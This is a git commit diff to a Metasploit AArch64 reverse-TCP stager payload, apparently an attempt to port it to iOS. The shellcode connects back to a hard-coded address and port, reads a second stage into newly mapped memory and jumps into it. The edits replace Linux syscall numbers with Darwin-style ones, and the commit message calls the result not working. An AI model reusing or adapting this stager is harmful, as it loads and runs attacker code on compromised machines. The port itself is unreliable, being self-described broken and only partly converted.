658e3bd17840d3f38f28cdaebdf529971aa60aaf
Tim <timrlw@gmail.com>
2017-12-14 14:12:01 +0800

    not working ios stager

--- modules/payloads/stagers/linux/aarch64/reverse_tcp.rb
+++ modules/payloads/stagers/linux/aarch64/reverse_tcp.rb
@@ -42,19 +42,19 @@ module MetasploitModule
             0xd2800040,          #  mov	x0, #0x2                   	// #2
             0xd2800021,          #  mov	x1, #0x1                   	// #1
             0xd2800002,          #  mov	x2, #0x0                   	// #0
-            0xd28018c8,          #  mov	x8, #0xc6                  	// #198
+            0x52800c30,          #  mov	w16, #0x61                  	// #97
             0xd4000001,          #  svc	#0x0
             0xaa0003ec,          #  mov	x12, x0
             0x100005a1,          #  adr	x1, cc <sockaddr>
             0xd2800202,          #  mov	x2, #0x10                  	// #16
-            0xd2801968,          #  mov	x8, #0xcb                  	// #203
+            0x52800c50,          #  mov	w16, #0x62                  	// #98
             0xd4000001,          #  svc	#0x0
             0x350004c0,          #  cbnz	w0, c0 <failed>
             0xaa0c03e0,          #  mov	x0, x12
             0xd10043ff,          #  sub	sp, sp, #0x10
             0x910003e1,          #  mov	x1, sp
             0xd2800082,          #  mov	x2, #0x4                   	// #4
-            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
+            0x52800070,          #  mov	w16, #0x3                   	// #3
             0xd4000001,          #  svc	#0x0
             0xb100041f,          #  cmn	x0, #0x1
             0x540003c0,          #  b.eq	c0 <failed>
@@ -65,10 +65,10 @@ module MetasploitModule
             0xaa1f03e0,          #  mov	x0, xzr
             0xaa0203e1,          #  mov	x1, x2
             0xd28000e2,          #  mov	x2, #0x7                   	// #7
-            0xd2800443,          #  mov	x3, #0x22                  	// #34
+            0xd2830043,          #  mov	x3, #0x1802                	// #6146
             0xaa1f03e4,          #  mov	x4, xzr
             0xaa1f03e5,          #  mov	x5, xzr
-            0xd2801bc8,          #  mov	x8, #0xde                  	// #222
+            0x528018b0,          #  mov	w16, #0xc5                  	// #197
             0xd4000001,          #  svc	#0x0
             0xb100041f,          #  cmn	x0, #0x1
             0x54000200,          #  b.eq	c0 <failed>
@@ -78,7 +78,7 @@ module MetasploitModule
             0xaa0c03e0,          #  mov	x0, x12
             0xaa0303e1,          #  mov	x1, x3
             0xaa0403e2,          #  mov	x2, x4
-            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
+            0x52800070,          #  mov	w16, #0x3                   	// #3
             0xd4000001,          #  svc	#0x0
             0xb100041f,          #  cmn	x0, #0x1
             0x540000c0,          #  b.eq	c0 <failed>
@@ -88,7 +88,7 @@ module MetasploitModule
             0xf94003e0,          #  ldr	x0, [sp]
             0xd63f0000,          #  blr	x0
             0xd2800000,          #  mov	x0, #0x0                   	// #0
-            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
+            0x52800030,          #  mov	w16, #0x1                   	// #1
             0xd4000001,          #  svc	#0x0
             0x5c110002,          #  .word	0x5c110002
             0x0100007f,          #  .word	0x0100007f
